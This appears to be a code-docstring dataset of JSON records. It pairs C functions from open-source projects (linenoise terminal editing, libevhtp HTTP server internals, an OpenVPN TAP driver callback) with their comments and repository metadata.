{"docstring": "/* Raw mode: 1960 magic shit. */\n", "func_signal": "static int enableRawMode(int fd)", "code": "{\n  struct termios raw;\n\n  if (!isatty(STDIN_FILENO))\n    goto fatal;\n  if (!atexit_registered) {\n    atexit(linenoiseAtExit);\n    atexit_registered = 1;\n  }\n  if (tcgetattr(fd, &orig_termios) == -1)\n    goto fatal;\n\n  raw = orig_termios; /* modify the original mode */\n  /* input modes: no break, no CR to NL, no parity check, no strip char,\n   * no start/stop output control. */\n  raw.c_iflag &= ~(BRKINT | ICRNL | INPCK | ISTRIP | IXON);\n  /* output modes - disable post processing */\n  raw.c_oflag &= ~(OPOST);\n  /* control modes - set 8 bit chars */\n  raw.c_cflag |= (CS8);\n  /* local modes - choing off, canonical off, no extended functions. */\n  raw.c_lflag &= ~(ECHO | ICANON | IEXTEN);\n  /* control chars - set return condition: min number of bytes and timer.\n   * We want read to return every single byte, without timeout. */\n  raw.c_cc[VMIN] = 1;\n  raw.c_cc[VTIME] = 0; /* 1 byte, no timer */\n\n  /* put terminal in raw mode after flushing */\n  if (tcsetattr(fd, TCSAFLUSH, &raw) < 0)\n    goto fatal;\n  rawmode = 1;\n  return 0;\n\nfatal:\n  errno = ENOTTY;\n  return -1;\n}", "path": "src\\readnoise\\linenoise.c", "repo_name": "andrewchambers/janetsh", "stars": 366, "license": "mit", "language": "c", "size": 1074}
{"docstring": "/* Calls the two low level functions refreshSingleLine() or\n * refreshMultiLine() according to the selected mode. */\n", "func_signal": "static void refreshLine(struct linenoiseState *l)", "code": "{\n  if (mlmode)\n    refreshMultiLine(l);\n  else\n    refreshSingleLine(l);\n}", "path": "src\\readnoise\\linenoise.c", "repo_name": "andrewchambers/janetsh", "stars": 366, "license": "mit", "language": "c", "size": 1074}
{"docstring": "/* Move cursor on the left. */\n", "func_signal": "void linenoiseEditMoveLeft(struct linenoiseState *l)", "code": "{\n  if (l->pos > 0) {\n    l->pos -= prevCharLen(l->buf, l->len, l->pos, NULL);\n    refreshLine(l);\n  }\n}", "path": "src\\readnoise\\linenoise.c", "repo_name": "andrewchambers/janetsh", "stars": 366, "license": "mit", "language": "c", "size": 1074}
{"docstring": "/* Beep, used for completion when there is nothing to complete or when all\n * the choices were already shown. */\n", "func_signal": "static void linenoiseBeep(void)", "code": "{\n  fprintf(stderr, \"\\x7\");\n  fflush(stderr);\n}", "path": "src\\readnoise\\linenoise.c", "repo_name": "andrewchambers/janetsh", "stars": 366, "license": "mit", "language": "c", "size": 1074}
{"docstring": "/* Get column length from begining of buffer to current byte position for\n * multiline mode*/\n", "func_signal": "static size_t columnPosForMultiLine(const char *buf, size_t buf_len, size_t pos,\n                                    size_t cols, size_t ini_pos)", "code": "{\n  size_t ret = 0;\n  size_t colwid = ini_pos;\n\n  size_t off = 0;\n  while (off < buf_len) {\n    size_t col_len;\n    size_t len = nextCharLen(buf, buf_len, off, &col_len);\n\n    int dif = (int)(colwid + col_len) - (int)cols;\n    if (dif > 0) {\n      ret += dif;\n      colwid = col_len;\n    } else if (dif == 0) {\n      colwid = 0;\n    } else {\n      colwid += col_len;\n    }\n\n    if (off >= pos)\n      break;\n    off += len;\n    ret += col_len;\n  }\n\n  return ret;\n}", "path": "src\\readnoise\\linenoise.c", "repo_name": "andrewchambers/janetsh", "stars": 366, "license": "mit", "language": "c", "size": 1074}
{"docstring": "/* Delete the character at the right of the cursor without altering the cursor\n * position. Basically this is what happens with the \"Delete\" keyboard key. */\n", "func_signal": "void linenoiseEditDelete(struct linenoiseState *l)", "code": "{\n  if (l->len > 0 && l->pos < l->len) {\n    int chlen = nextCharLen(l->buf, l->len, l->pos, NULL);\n    memmove(l->buf + l->pos, l->buf + l->pos + chlen, l->len - l->pos - chlen);\n    l->len -= chlen;\n    l->buf[l->len] = '\\0';\n    refreshLine(l);\n  }\n}", "path": "src\\readnoise\\linenoise.c", "repo_name": "andrewchambers/janetsh", "stars": 366, "license": "mit", "language": "c", "size": 1074}
{"docstring": "/* This is the API call to add a new entry in the linenoise history.\n * It uses a fixed array of char pointers that are shifted (memmoved)\n * when the history max length is reached in order to remove the older\n * entry and make room for the new one, so it is not exactly suitable for huge\n * histories, but will work well for a few hundred of entries.\n *\n * Using a circular buffer is smarter, but a bit more complex to handle. */\n", "func_signal": "int linenoiseHistoryAdd(const char *line)", "code": "{\n  char *linecopy;\n\n  if (history_max_len == 0)\n    return 0;\n\n  /* Initialization on first call. */\n  if (history == NULL) {\n    history = malloc(sizeof(char *) * history_max_len);\n    if (history == NULL)\n      return 0;\n    memset(history, 0, (sizeof(char *) * history_max_len));\n  }\n\n  /* Don't add duplicated lines. */\n  if (history_len && !strcmp(history[history_len - 1], line))\n    return 0;\n\n  /* Add an heap allocated copy of the line in the history.\n   * If we reached the max length, remove the older line. */\n  linecopy = strdup(line);\n  if (!linecopy)\n    return 0;\n  if (history_len == history_max_len) {\n    free(history[0]);\n    memmove(history, history + 1, sizeof(char *) * (history_max_len - 1));\n    history_len--;\n  }\n  history[history_len] = linecopy;\n  history_len++;\n  return 1;\n}", "path": "src\\readnoise\\linenoise.c", "repo_name": "andrewchambers/janetsh", "stars": 366, "license": "mit", "language": "c", "size": 1074}
{"docstring": "/* Move cursor to the start of the line. */\n", "func_signal": "void linenoiseEditMoveHome(struct linenoiseState *l)", "code": "{\n  if (l->pos != 0) {\n    l->pos = 0;\n    refreshLine(l);\n  }\n}", "path": "src\\readnoise\\linenoise.c", "repo_name": "andrewchambers/janetsh", "stars": 366, "license": "mit", "language": "c", "size": 1074}
{"docstring": "/* Move cursor to the end of the line. */\n", "func_signal": "void linenoiseEditMoveEnd(struct linenoiseState *l)", "code": "{\n  if (l->pos != l->len) {\n    l->pos = l->len;\n    refreshLine(l);\n  }\n}", "path": "src\\readnoise\\linenoise.c", "repo_name": "andrewchambers/janetsh", "stars": 366, "license": "mit", "language": "c", "size": 1074}
{"docstring": "/* evhtp_callback_new */\n", "func_signal": "void\nevhtp_callback_free(evhtp_callback_t * callback)", "code": "{\n    if (callback == NULL) {\n        return;\n    }\n\n    switch (callback->type) {\n        case evhtp_callback_type_hash:\n            evhtp_safe_free(callback->val.path, htp__free_);\n            break;\n        case evhtp_callback_type_glob:\n            evhtp_safe_free(callback->val.glob, htp__free_);\n            break;\n#ifndef EVHTP_DISABLE_REGEX\n        case evhtp_callback_type_regex:\n            evhtp_safe_free(callback->val.regex, htp__free_);\n            break;\n#endif\n    }\n\n    if (callback->hooks) {\n        evhtp_safe_free(callback->hooks, htp__free_);\n    }\n\n    evhtp_safe_free(callback, htp__free_);\n\n    return;\n}", "path": "evhtp.c", "repo_name": "Yellow-Camper/libevhtp", "stars": 417, "license": "bsd-3-clause", "language": "c", "size": 2801}
{"docstring": "/**\n * @brief Wrapper for free so that a different free can be used\n * if desired.\n *\n * @see evhtp_set_mem_functions\n *\n * @param ptr pointer to memory to be freed.\n *\n */\n", "func_signal": "static void\nhtp__free_(void * ptr)", "code": "{\n    if (ptr == NULL) {\n        return;\n    }\n\n    evhtp_safe_free(ptr, free_);\n}", "path": "evhtp.c", "repo_name": "Yellow-Camper/libevhtp", "stars": 417, "license": "bsd-3-clause", "language": "c", "size": 2801}
{"docstring": "/* htp_worker_init_ */\n", "func_signal": "int\nmain(int argc, char ** argv)", "code": "{\n    (void)argc;\n    (void)argv;\n\n    struct event_base * evbase;\n    struct event      * dummy_ev;\n    evthr_pool_t      * workers;\n\n    evbase   = event_base_new();\n    dummy_ev = event_new(evbase, -1,\n        EV_READ | EV_PERSIST,\n        dummy_eventcb_, NULL);\n\n    event_add(dummy_ev, NULL);\n\n    if (!(workers =\n              evthr_pool_wexit_new(CPU__COUNT, htp_worker_init_, NULL, NULL))) {\n        exit(EXIT_FAILURE);\n    }\n\n    evthr_pool_start(workers);\n    event_base_loop(evbase, 0);\n\n    return 0;\n}", "path": "examples\\example_locality.c", "repo_name": "Yellow-Camper/libevhtp", "stars": 417, "license": "bsd-3-clause", "language": "c", "size": 2801}
{"docstring": "/**\n * @brief Starts the parser for the connection associated with the parser struct\n *\n * @param p\n * @return  0 on success, -1 on fail\n */\n", "func_signal": "static int\nhtp__request_parse_start_(htparser * p)", "code": "{\n    evhtp_connection_t * c;\n\n    if (p == NULL) {\n        return 0;\n    }\n\n    if (!(c = htparser_get_userdata(p))) {\n        return 0;\n    }\n\n    if (evhtp_unlikely(c->type == evhtp_type_client)) {\n        return 0;\n    }\n\n    if (c->flags & EVHTP_CONN_FLAG_PAUSED) {\n        return -1;\n    }\n\n    if (c->request) {\n        if (c->request->flags & EVHTP_REQ_FLAG_FINISHED) {\n            evhtp_safe_free(c->request, htp__request_free_);\n        } else {\n            return -1;\n        }\n    }\n\n    if (((c->request = htp__request_new_(c))) == NULL) {\n        return -1;\n    }\n\n    return 0;\n}", "path": "evhtp.c", "repo_name": "Yellow-Camper/libevhtp", "stars": 417, "license": "bsd-3-clause", "language": "c", "size": 2801}
{"docstring": "/**\n * @brief runs the user-defined on_path hook for a request\n *\n * @param request the request structure\n * @param path the path structure\n *\n * @return EVHTP_RES_OK on success, otherwise something else.\n */\n", "func_signal": "static inline evhtp_res\nhtp__hook_path_(struct evhtp_request * request, struct evhtp_path * path)", "code": "{\n    HOOK_REQUEST_RUN(request, on_path, path);\n\n    return EVHTP_RES_OK;\n}", "path": "evhtp.c", "repo_name": "Yellow-Camper/libevhtp", "stars": 417, "license": "bsd-3-clause", "language": "c", "size": 2801}
{"docstring": "/* htp__connection_eventcb_ */\n", "func_signal": "static void\nhtp__connection_resumecb_(int fd, short events, void * arg)", "code": "{\n    evhtp_connection_t * c = arg;\n\n    log_debug(\"resumecb\");\n\n    /* unset the pause flag */\n    HTP_FLAG_OFF(c, EVHTP_CONN_FLAG_PAUSED);\n\n    if (c->request) {\n        log_debug(\"cr status = OK %d\", c->cr_status);\n        c->cr_status = EVHTP_RES_OK;\n    }\n\n    if (c->flags & EVHTP_CONN_FLAG_FREE_CONN) {\n        log_debug(\"flags == FREE_CONN\");\n        evhtp_safe_free(c, evhtp_connection_free);\n\n        return;\n    }\n\n    /* XXX this is a hack to show a potential fix for issues/86, the main indea\n     * is that you call resume AFTER you have sent the reply (not BEFORE).\n     *\n     * When it has been decided this is a proper fix, the pause bit should be\n     * changed to a state-type flag.\n     */\n\n    if (HTP_LEN_OUTPUT(c->bev)) {\n        log_debug(\"SET WAITING\");\n\n        HTP_FLAG_ON(c, EVHTP_CONN_FLAG_WAITING);\n\n        if (HTP_IS_WRITING(c->bev) == false) {\n            log_debug(\"ENABLING EV_WRITE\");\n\n            bufferevent_enable(c->bev, EV_WRITE);\n        }\n    } else {\n        log_debug(\"SET READING\");\n\n        if (HTP_IS_READING(c->bev) == false) {\n            log_debug(\"ENABLING EV_READ\");\n\n            bufferevent_enable(c->bev, EV_READ | EV_WRITE);\n        }\n\n        if (HTP_LEN_INPUT(c->bev)) {\n            log_debug(\"calling readcb directly\");\n            htp__connection_readcb_(c->bev, c);\n        }\n    }\n}", "path": "evhtp.c", "repo_name": "Yellow-Camper/libevhtp", "stars": 417, "license": "bsd-3-clause", "language": "c", "size": 2801}
{"docstring": "/**\n * @brief [debug] print the psuedo-stack\n *\n * @param stack\n */\n", "func_signal": "static void\ndump_(struct htp_log_format * format)", "code": "{\n    struct htp_log_op * op;\n\n    TAILQ_FOREACH(op, format, next) {\n        switch (op->type) {\n            case HTP_LOG_OP_USERAGENT:\n                printf(\"$ua\");\n                break;\n            case HTP_LOG_OP_PATH:\n                printf(\"$path\");\n                break;\n            case HTP_LOG_OP_METHOD:\n                printf(\"$meth\");\n                break;\n            case HTP_LOG_OP_TIMESTAMP:\n                printf(\"$ts\");\n                break;\n            case HTP_LOG_OP_REFERRER:\n                printf(\"$ref\");\n                break;\n            case HTP_LOG_OP_RHOST:\n                printf(\"$rhost\");\n                break;\n            case HTP_LOG_OP_STATUS:\n                printf(\"$status\");\n                break;\n            case HTP_LOG_OP_HOST:\n                printf(\"$host\");\n                break;\n            case HTP_LOG_OP_HEADER:\n                printf(\"$hdr::\");\n                break;\n            case HTP_LOG_OP_PROTO:\n                printf(\"$proto\");\n                break;\n            case HTP_LOG_OP_PRINTABLE:\n                printf(\"%s\", op->tag);\n                break;\n        } /* switch */\n    }\n\n    printf(\"\\n\");\n}", "path": "log.c", "repo_name": "Yellow-Camper/libevhtp", "stars": 417, "license": "bsd-3-clause", "language": "c", "size": 2801}
{"docstring": "/* _evthr_loop */\n", "func_signal": "evthr_res\nevthr_defer(evthr_t * thread, evthr_cb cb, void * arg)", "code": "{\n    evthr_cmd_t cmd = {\n        .cb   = cb,\n        .args = arg,\n        .stop = 0\n    };\n\n    if (send(thread->wdr, &cmd, sizeof(cmd), 0) <= 0) {\n        return EVTHR_RES_RETRY;\n    }\n\n    return EVTHR_RES_OK;\n}", "path": "thread.c", "repo_name": "Yellow-Camper/libevhtp", "stars": 417, "license": "bsd-3-clause", "language": "c", "size": 2801}
{"docstring": "/* htp__request_parse_args_ */\n", "func_signal": "static int\nhtp__request_parse_headers_start_(htparser * p)", "code": "{\n    evhtp_connection_t * c = htparser_get_userdata(p);\n\n    if ((c->cr_status = htp__hook_headers_start_(c->request)) != EVHTP_RES_OK) {\n        return -1;\n    }\n\n    return 0;\n}", "path": "evhtp.c", "repo_name": "Yellow-Camper/libevhtp", "stars": 417, "license": "bsd-3-clause", "language": "c", "size": 2801}
{"docstring": "/**\n * @brief frees an authority structure\n *\n * @param authority evhtp_authority_t\n */\n", "func_signal": "static void\nhtp__authority_free_(evhtp_authority_t * authority)", "code": "{\n    if (authority == NULL) {\n        return;\n    }\n\n    evhtp_safe_free(authority->username, htp__free_);\n    evhtp_safe_free(authority->password, htp__free_);\n    evhtp_safe_free(authority->hostname, htp__free_);\n\n    evhtp_safe_free(authority, htp__free_);\n}", "path": "evhtp.c", "repo_name": "Yellow-Camper/libevhtp", "stars": 417, "license": "bsd-3-clause", "language": "c", "size": 2801}
{"docstring": "/* This function is called each time the client has been sent\n * all outstanding data. We use this to send the next part of\n * the file in a chunk at 128 byte increments.\n *\n * When there is no more data to be read from the file, this\n * will send the final chunked reply and free our struct reply_.\n */\n", "func_signal": "static evhtp_res\nhttp__send_chunk_(evhtp_connection_t * conn, void * arg)", "code": "{\n    struct reply_ * reply = (struct reply_ *)arg;\n    char            buf[128];\n    size_t          bytes_read;\n\n    /* try to read 128 bytes from the file pointer */\n    bytes_read = fread(buf, 1, sizeof(buf), reply->file_desc);\n\n    log_info(\"Sending %zu bytes\", bytes_read);\n\n    if (bytes_read > 0) {\n        /* add our data we read from the file into our reply buffer */\n        evbuffer_add(reply->buffer, buf, bytes_read);\n\n        /* send the reply buffer as a http chunked message */\n        evhtp_send_reply_chunk(reply->request, reply->buffer);\n\n        /* we can now drain our reply buffer as to not be a resource\n         * hog.\n         */\n        evbuffer_drain(reply->buffer, bytes_read);\n    }\n\n    /* check if we have read everything from the file */\n    if (feof(reply->file_desc)) {\n        log_info(\"Sending last chunk\");\n\n        /* now that we have read everything from the file, we must\n         * first unset our on_write hook, then inform evhtp to send\n         * this message as the final chunk.\n         */\n        evhtp_connection_unset_hook(conn, evhtp_hook_on_write);\n        evhtp_send_reply_chunk_end(reply->request);\n\n        /* we can now free up our little reply_ structure */\n        {\n            fclose(reply->file_desc);\n\n            evhtp_safe_free(reply->buffer, evbuffer_free);\n            evhtp_safe_free(reply, free);\n        }\n    }\n\n    return EVHTP_RES_OK;\n}", "path": "examples\\example_chunked.c", "repo_name": "Yellow-Camper/libevhtp", "stars": 417, "license": "bsd-3-clause", "language": "c", "size": 2801}
{"docstring": "/* htp__connection_resumecb_ */\n", "func_signal": "static int\nhtp__run_pre_accept_(evhtp_t * htp, evhtp_connection_t * conn)", "code": "{\n    void    * args;\n    evhtp_res res;\n\n    if (evhtp_likely(htp->defaults.pre_accept == NULL)) {\n        return 0;\n    }\n\n    args = htp->defaults.pre_accept_cbarg;\n    res  = htp->defaults.pre_accept(conn, args);\n\n    if (res != EVHTP_RES_OK) {\n        return -1;\n    }\n\n    return 0;\n}", "path": "evhtp.c", "repo_name": "Yellow-Camper/libevhtp", "stars": 417, "license": "bsd-3-clause", "language": "c", "size": 2801}
{"docstring": "/**\n * @brief Locates a given callback offsets performs a regex pattern match\n *\n * @param [IN] cbs ptr to evhtp_callbacks_t structure\n * @param [IN] path\n * @param [OUT] start_offset\n * @param [OUT] end_offset\n * @return\n */\n", "func_signal": "static evhtp_callback_t *\nhtp__callback_find_(evhtp_callbacks_t * cbs,\n                    const char        * path,\n                    unsigned int      * start_offset,\n                    unsigned int      * end_offset)", "code": "{\n    size_t             path_len;\n    evhtp_callback_t * callback;\n\n#ifndef EVHTP_DISABLE_REGEX\n    regmatch_t         pmatch[28];\n#endif\n\n    if (evhtp_unlikely(cbs == NULL)) {\n        return NULL;\n    }\n\n    path_len = strlen(path);\n\n    TAILQ_FOREACH(callback, cbs, next) {\n        switch (callback->type) {\n            case evhtp_callback_type_hash:\n                if (strncmp(path, callback->val.path, callback->len) == 0) {\n                    *start_offset = 0;\n                    *end_offset   = path_len;\n\n                    return callback;\n                }\n\n                break;\n#ifndef EVHTP_DISABLE_REGEX\n            case evhtp_callback_type_regex:\n                if (regexec(callback->val.regex,\n                        path,\n                        callback->val.regex->re_nsub + 1,\n                        pmatch, 0) == 0) {\n                    *start_offset = pmatch[callback->val.regex->re_nsub].rm_so;\n                    *end_offset   = pmatch[callback->val.regex->re_nsub].rm_eo;\n\n                    return callback;\n                }\n\n                break;\n#endif\n            case evhtp_callback_type_glob:\n            {\n                size_t glob_len = strlen(callback->val.glob);\n\n                if (htp__glob_match_(callback->val.glob,\n                        glob_len,\n                        path,\n                        path_len) == 1) {\n                    *start_offset = 0;\n                    *end_offset   = path_len;\n\n                    return callback;\n                }\n            }\n            default:\n                break;\n        } /* switch */\n    }\n\n    return NULL;\n}", "path": "evhtp.c", "repo_name": "Yellow-Camper/libevhtp", "stars": 417, "license": "bsd-3-clause", "language": "c", "size": 2801}
{"docstring": "/* htp__connection_writecb_ */\n", "func_signal": "static void\nhtp__connection_eventcb_(struct bufferevent * bev, short events, void * arg)", "code": "{\n    evhtp_connection_t * c = arg;\n\n    log_debug(\"%p %p eventcb %s%s%s%s\", arg, (void *)bev,\n        events & BEV_EVENT_CONNECTED ? \"connected\" : \"\",\n        events & BEV_EVENT_ERROR     ? \"error\"     : \"\",\n        events & BEV_EVENT_TIMEOUT   ? \"timeout\"   : \"\",\n        events & BEV_EVENT_EOF       ? \"eof\"       : \"\");\n\n    if (c->hooks && c->hooks->on_event) {\n        (c->hooks->on_event)(c, events, c->hooks->on_event_arg);\n    }\n\n    if ((events & BEV_EVENT_CONNECTED)) {\n        log_debug(\"CONNECTED\");\n\n        if (evhtp_likely(c->type == evhtp_type_client)) {\n            HTP_FLAG_ON(c, EVHTP_CONN_FLAG_CONNECTED);\n\n            bufferevent_setcb(bev,\n                htp__connection_readcb_,\n                htp__connection_writecb_,\n                htp__connection_eventcb_, c);\n        }\n\n        return;\n    }\n\n#ifndef EVHTP_DISABLE_SSL\n    if (c->ssl && !(events & BEV_EVENT_EOF)) {\n#ifdef EVHTP_DEBUG\n        unsigned long sslerr;\n\n        while ((sslerr = bufferevent_get_openssl_error(bev))) {\n            log_error(\"SSL ERROR %lu:%i:%s:%i:%s:%i:%s\",\n                sslerr,\n                ERR_GET_REASON(sslerr),\n                ERR_reason_error_string(sslerr),\n                ERR_GET_LIB(sslerr),\n                ERR_lib_error_string(sslerr),\n                ERR_GET_FUNC(sslerr),\n                ERR_func_error_string(sslerr));\n        }\n#endif\n\n        /* XXX need to do better error handling for SSL specific errors */\n        HTP_FLAG_ON(c, EVHTP_CONN_FLAG_ERROR);\n\n        if (c->request) {\n            HTP_FLAG_ON(c->request, EVHTP_REQ_FLAG_ERROR);\n        }\n    }\n\n#endif\n\n    if (events == (BEV_EVENT_EOF | BEV_EVENT_READING)) {\n        log_debug(\"EOF | READING\");\n\n        if (errno == EAGAIN) {\n            /* libevent will sometimes recv again when it's not actually ready,\n             * this results in a 0 return value, and errno will be set to EAGAIN\n             * (try again). This does not mean there is a hard socket error, but\n             * simply needs to be read again.\n             *\n             * but libevent will disable the read side of the bufferevent\n             * anyway, so we must re-enable it.\n             */\n            log_debug(\"errno EAGAIN\");\n\n            if (HTP_IS_READING(bev) == false) {\n                bufferevent_enable(bev, EV_READ);\n            }\n\n            errno = 0;\n\n            return;\n        }\n    }\n\n    /* set the error mask */\n    HTP_FLAG_ON(c, EVHTP_CONN_FLAG_ERROR);\n\n    /* unset connected flag */\n    HTP_FLAG_OFF(c, EVHTP_CONN_FLAG_CONNECTED);\n\n    htp__hook_connection_error_(c, events);\n\n    if (c->flags & EVHTP_CONN_FLAG_PAUSED) {\n        /* we are currently paused, so we don't want to free just yet, let's\n         * wait till the next loop.\n         */\n        HTP_FLAG_ON(c, EVHTP_CONN_FLAG_FREE_CONN);\n    } else {\n        evhtp_safe_free(c, evhtp_connection_free);\n    }\n}", "path": "evhtp.c", "repo_name": "Yellow-Camper/libevhtp", "stars": 417, "license": "bsd-3-clause", "language": "c", "size": 2801}
{"docstring": "/**\n * @brief Runs the user defined on_headers_start hook\n *\n * @param request\n * @return\n */\n", "func_signal": "static inline evhtp_res\nhtp__hook_headers_start_(struct evhtp_request * request)", "code": "{\n    HOOK_REQUEST_RUN_NARGS(request, on_headers_start);\n\n    return EVHTP_RES_OK;\n}", "path": "evhtp.c", "repo_name": "Yellow-Camper/libevhtp", "stars": 417, "license": "bsd-3-clause", "language": "c", "size": 2801}
{"docstring": "/**\n * @brief Correctly frees the evhtp_path_t ptr that is passed in.\n * @param path\n */\n", "func_signal": "static void\nhtp__path_free_(struct evhtp_path * path)", "code": "{\n    if (evhtp_unlikely(path == NULL)) {\n        return;\n    }\n\n    evhtp_safe_free(path->full, htp__free_);\n    evhtp_safe_free(path->path, htp__free_);\n    evhtp_safe_free(path->file, htp__free_);\n    evhtp_safe_free(path->match_start, htp__free_);\n    evhtp_safe_free(path->match_end, htp__free_);\n\n    evhtp_safe_free(path, htp__free_);\n}", "path": "evhtp.c", "repo_name": "Yellow-Camper/libevhtp", "stars": 417, "license": "bsd-3-clause", "language": "c", "size": 2801}
{"docstring": "/**\n * @brief determines if the request body contains the query arguments.\n *        if the query is NULL and the content length of the body has never\n *        been drained, and the content-type is x-www-form-urlencoded, the\n *        function returns 1\n *\n * @param req\n *\n * @return 1 if evhtp can use the body as the query arguments, 0 otherwise.\n */\n", "func_signal": "static int\nhtp__should_parse_query_body_(evhtp_request_t * req)", "code": "{\n    const char * content_type;\n\n    if (req == NULL) {\n        return 0;\n    }\n\n    if (req->uri == NULL || req->uri->query != NULL) {\n        return 0;\n    }\n\n    if (evhtp_request_content_len(req) == 0) {\n        return 0;\n    }\n\n    if (evhtp_request_content_len(req) !=\n        evbuffer_get_length(req->buffer_in)) {\n        return 0;\n    }\n\n    content_type = evhtp_kv_find(req->headers_in, \"content-type\");\n\n    if (content_type == NULL) {\n        return 0;\n    }\n\n    if (strncasecmp(content_type, \"application/x-www-form-urlencoded\", 33)) {\n        return 0;\n    }\n\n    return 1;\n}", "path": "evhtp.c", "repo_name": "Yellow-Camper/libevhtp", "stars": 417, "license": "bsd-3-clause", "language": "c", "size": 2801}
{"docstring": "/* htp__request_parse_path_ */\n", "func_signal": "static int\nhtp__request_parse_headers_(htparser * p)", "code": "{\n    evhtp_connection_t * c;\n\n    if ((c = htparser_get_userdata(p)) == NULL) {\n        return -1;\n    }\n\n    /* XXX proto should be set with htparsers on_hdrs_begin hook */\n\n    if (htparser_should_keep_alive(p) == 1) {\n        HTP_FLAG_ON(c->request, EVHTP_REQ_FLAG_KEEPALIVE);\n    }\n\n    c->cr_proto  = htp__protocol_(htparser_get_major(p), htparser_get_minor(p));\n    c->cr_status = htp__hook_headers_(c->request, c->request->headers_in);\n\n    if (c->cr_status != EVHTP_RES_OK) {\n        return -1;\n    }\n\n    if (c->type == evhtp_type_server\n        && c->htp->flags & EVHTP_FLAG_ENABLE_100_CONT) {\n        /* only send a 100 continue response if it hasn't been disabled via\n         * evhtp_disable_100_continue.\n         */\n        if (!evhtp_header_find(c->request->headers_in, \"Expect\")) {\n            return 0;\n        }\n\n        evbuffer_add_printf(bufferevent_get_output(c->bev),\n            \"HTTP/%c.%c 100 Continue\\r\\n\\r\\n\",\n            evhtp_modp_uchartoa(htparser_get_major(p)),\n            evhtp_modp_uchartoa(htparser_get_minor(p)));\n    }\n\n    return 0;\n}", "path": "evhtp.c", "repo_name": "Yellow-Camper/libevhtp", "stars": 417, "license": "bsd-3-clause", "language": "c", "size": 2801}
{"docstring": "/**\n * @brief parses the path and file from an input buffer\n *\n * @details in order to properly create a structure that can match\n *          both a path and a file, this will parse a string into\n *          what it considers a path, and a file.\n *\n * @details if for example the input was \"/a/b/c\", the parser will\n *          consider \"/a/b/\" as the path, and \"c\" as the file.\n *\n * @param the unallocated destination buffer.\n * @param data raw input data (assumes a /path/[file] structure)\n * @param len length of the input data\n *\n * @return 0 on success, -1 on error.\n */\n", "func_signal": "static int\nhtp__path_new_(evhtp_path_t ** out, const char * data, size_t len)", "code": "{\n    struct evhtp_path * req_path = NULL;\n    const char        * data_end = (const char *)(data + len);\n    char              * path     = NULL;\n    char              * file     = NULL;\n\n\n    req_path = htp__calloc_(1, sizeof(*req_path));\n\n#ifndef NDEBUG\n    if (req_path == NULL) {\n        return -1;\n    }\n\n#endif\n    *out = NULL;\n\n    if (evhtp_unlikely(len == 0)) {\n        /*\n         * odd situation here, no preceding \"/\", so just assume the path is \"/\"\n         */\n        path = htp__strdup_(\"/\");\n\n        if (evhtp_unlikely(path == NULL)) {\n            goto error;\n        }\n    } else if (*data != '/') {\n        /* request like GET stupid HTTP/1.0, treat stupid as the file, and\n         * assume the path is \"/\"\n         */\n        path = htp__strdup_(\"/\");\n\n        if (evhtp_unlikely(path == NULL)) {\n            goto error;\n        }\n\n        file = htp__strndup_(data, len);\n\n        if (evhtp_unlikely(file == NULL)) {\n            goto error;\n        }\n    } else {\n        if (data[len - 1] != '/') {\n            /*\n             * the last character in data is assumed to be a file, not the end of path\n             * loop through the input data backwards until we find a \"/\"\n             */\n            size_t i;\n\n            for (i = (len - 1); i != 0; i--) {\n                if (data[i] == '/') {\n                    /*\n                     * we have found a \"/\" representing the start of the file,\n                     * and the end of the path\n                     */\n                    size_t path_len;\n                    size_t file_len;\n\n                    path_len = (size_t)(&data[i] - data) + 1;\n                    file_len = (size_t)(data_end - &data[i + 1]);\n\n                    /* check for overflow */\n                    if ((const char *)(data + path_len) > data_end) {\n                        goto error;\n                    }\n\n                    /* check for overflow */\n                    if ((const char *)(&data[i + 1] + file_len) > data_end) {\n                        goto error;\n                    }\n\n                    path = htp__strndup_(data, path_len);\n\n                    if (evhtp_unlikely(path == NULL)) {\n                        goto error;\n                    }\n\n                    file = htp__strndup_(&data[i + 1], file_len);\n\n                    if (evhtp_unlikely(file == NULL)) {\n                        goto error;\n                    }\n\n                    break;\n                }\n            }\n\n            if (i == 0 && data[i] == '/' && !file && !path) {\n                /* drops here if the request is something like GET /foo */\n                path = htp__strdup_(\"/\");\n\n                if (evhtp_unlikely(path == NULL)) {\n                    goto error;\n                }\n\n                if (len > 1) {\n                    file = htp__strndup_((const char *)(data + 1), len);\n\n                    if (evhtp_unlikely(file == NULL)) {\n                        goto error;\n                    }\n                }\n            }\n        } else {\n            /* the last character is a \"/\", thus the request is just a path */\n            path = htp__strndup_(data, len);\n\n            if (evhtp_unlikely(path == NULL)) {\n                goto error;\n            }\n        }\n    }\n\n    if (len != 0) {\n        req_path->full = htp__strndup_(data, len);\n    } else {\n        req_path->full = htp__strdup_(\"/\");\n    }\n\n    if (evhtp_unlikely(req_path->full == NULL)) {\n        goto error;\n    }\n\n    req_path->path = path;\n    req_path->file = file;\n\n    *out           = req_path;\n\n    return 0;\nerror:\n    evhtp_safe_free(path, htp__free_);\n    evhtp_safe_free(file, htp__free_);\n    evhtp_safe_free(req_path, htp__path_free_);\n\n    return -1;\n}", "path": "evhtp.c", "repo_name": "Yellow-Camper/libevhtp", "stars": 417, "license": "bsd-3-clause", "language": "c", "size": 2801}
{"docstring": "/**\n * @brief returns the HTTP protocol version\n *\n * @param major the major version number\n * @param minor the minor version number\n *\n * @return EVHTP_PROTO_10 if HTTP/1.0, EVHTP_PROTO_11 if HTTP/1.1, otherwise\n *         EVHTP_PROTO_INVALID\n */\n", "func_signal": "static inline evhtp_proto\nhtp__protocol_(const char major, const char minor)", "code": "{\n    if (htp__is_http_10_(major, minor)) {\n        return EVHTP_PROTO_10;\n    }\n\n    if (htp__is_http_11_(major, minor)) {\n        return EVHTP_PROTO_11;\n    }\n\n    return EVHTP_PROTO_INVALID;\n}", "path": "evhtp.c", "repo_name": "Yellow-Camper/libevhtp", "stars": 417, "license": "bsd-3-clause", "language": "c", "size": 2801}
{"docstring": "//==============================================\n// IRPs get cancelled for a number of reasons.\n//\n// The TAP device could be closed by userspace\n// when there are still pending read operations.\n//\n// The user could disable the TAP adapter in the\n// network connections control panel, while the\n// device is still open by a process.\n//==============================================\n", "func_signal": "VOID\nCancelIRPCallback (IN PDEVICE_OBJECT p_DeviceObject,\n\t\t   IN PIRP p_IRP)", "code": "{\n  TapAdapterPointer l_Adapter = LookupAdapterInInstanceList (p_DeviceObject);\n  CancelIRP (l_Adapter ? &l_Adapter->m_Extension : NULL, p_IRP, TRUE);\n}", "path": "src\\tapdrvr.c", "repo_name": "OpenVPN/tap-windows", "stars": 349, "license": "other", "language": "c", "size": 6668}
